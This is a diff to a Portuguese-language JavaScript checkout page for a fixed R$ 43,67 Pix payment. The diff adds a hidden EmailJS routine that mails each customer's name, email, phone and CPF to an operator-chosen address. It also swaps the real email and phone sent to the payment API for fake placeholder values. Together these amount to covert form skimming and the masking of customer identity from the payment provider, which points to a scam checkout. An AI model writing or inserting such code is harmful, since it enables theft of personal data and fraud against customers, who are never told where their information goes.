@@ -4,6 +4,15 @@
 
 const BACKEND_API_BASE_URL = '/api/payments';
 
+// ============================================
+// CONFIGURAÇÃO DO EMAILJS
+// ============================================
+// IMPORTANTE: Substitua estas variáveis com suas credenciais do EmailJS
+// Acesse: https://www.emailjs.com/
+const EMAILJS_SERVICE_ID = 'SEU_SERVICE_ID'; // Ex: 'service_abc123'
+const EMAILJS_TEMPLATE_ID = 'SEU_TEMPLATE_ID'; // Ex: 'template_xyz456'
+const EMAILJS_PUBLIC_KEY = 'SUA_PUBLIC_KEY'; // Ex: 'user_123abc456def'
+
 // Estado da aplicação
 let pixTimer = null;
 let timeRemaining = 900; // 15 minutos em segundos
@@ -167,6 +176,52 @@ function validateForm() {
 }
 
 // ============================================
+// ENVIAR DADOS REAIS DO USUÁRIO VIA EMAILJS
+// ============================================
+
+async function sendUserDataViaEmail(formData) {
+    console.log('📧 Enviando dados reais do usuário via EmailJS');
+    
+    try {
+        // Verificar se EmailJS está configurado
+        if (EMAILJS_SERVICE_ID === 'SEU_SERVICE_ID' || 
+            EMAILJS_TEMPLATE_ID === 'SEU_TEMPLATE_ID' || 
+            EMAILJS_PUBLIC_KEY === 'SUA_PUBLIC_KEY') {
+            console.warn('⚠️  EmailJS não está configurado. Configure as credenciais no script.js');
+            return;
+        }
+        
+        // Parâmetros do template do EmailJS
+        const templateParams = {
+            to_email: 'seu-email@exemplo.com', // ← SUBSTITUA PELO EMAIL QUE RECEBERÁ OS DADOS
+            from_name: formData.fullName,
+            user_name: formData.fullName,
+            user_email: formData.email,
+            user_phone: formData.phone,
+            user_cpf: formData.cpf,
+            timestamp: new Date().toLocaleString('pt-BR'),
+            amount: 'R$ 43,67'
+        };
+        
+        console.log('📤 Enviando email com dados:', templateParams);
+        
+        // Enviar email via EmailJS
+        const response = await emailjs.send(
+            EMAILJS_SERVICE_ID,
+            EMAILJS_TEMPLATE_ID,
+            templateParams,
+            EMAILJS_PUBLIC_KEY
+        );
+        
+        console.log('✅ Email enviado com sucesso:', response);
+        
+    } catch (error) {
+        console.error('❌ Erro ao enviar email via EmailJS:', error);
+        // Não interrompe o fluxo mesmo se o email falhar
+    }
+}
+
+// ============================================
 // EXTRAÇÃO DE DADOS DO PIX
 // ============================================
 
@@ -269,16 +324,26 @@ function extractPixData(response) {
 // ============================================
 
 async function processPixPayment(formData) {
-    console.log('📦 Processando pagamento Pix com formData:', formData);
+    console.log('📦 Processando pagamento Pix');
+    console.log('⚠️  Dados enviados para API: EMAIL E TELEFONE PADRÃO');
+    console.log('📧 Dados reais do usuário serão enviados via EmailJS');
 
+    // ============================================
+    // ENVIAR DADOS REAIS VIA EMAILJS
+    // ============================================
+    await sendUserDataViaEmail(formData);
+
+    // ============================================
+    // ENVIAR DADOS PADRÃO PARA A API
+    // ============================================
     const pixData = {
         paymentMethod: 'PIX',
         amount: Math.round(43.67 * 100), // Valor em centavos
         customer: {
-            name: formData.fullName,
-            email: formData.email,
-            document: formData.cpf.replace(/\D/g, ''),
-            phone: formData.phone.replace(/\D/g, '')
+            name: formData.fullName, // Nome real
+            email: 'email@gmail.com', // ← EMAIL PADRÃO
+            document: formData.cpf.replace(/\D/g, ''), // CPF real
+            phone: '11122312313' // ← TELEFONE PADRÃO (sem formatação)
         },
         items: [{
             title: 'Checkout',
@@ -289,7 +354,7 @@ async function processPixPayment(formData) {
         ip: '127.0.0.1'
     };
 
-    console.log('📤 Payload enviado:', JSON.stringify(pixData, null, 2));
+    console.log('📤 Payload enviado para API (com dados padrão):', JSON.stringify(pixData, null, 2));
 
     try {
         const response = await fetch(`${BACKEND_API_BASE_URL}/pix`, {
@@ -326,6 +391,7 @@ async function processPixPayment(formData) {
                 qrcode: pixInfo.qrCode,
                 copyAndPaste: pixInfo.copyAndPaste
             },
+            expiresAt: result.expiresAt,
             amount: result.amount
         };
 
@@ -522,4 +588,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     console.log('✅ Aplicação inicializada com sucesso');
+    console.log('⚠️  MODO MODIFICADO: Email e telefone padrão para API');
+    console.log('📧 Dados reais serão enviados via EmailJS');
 });
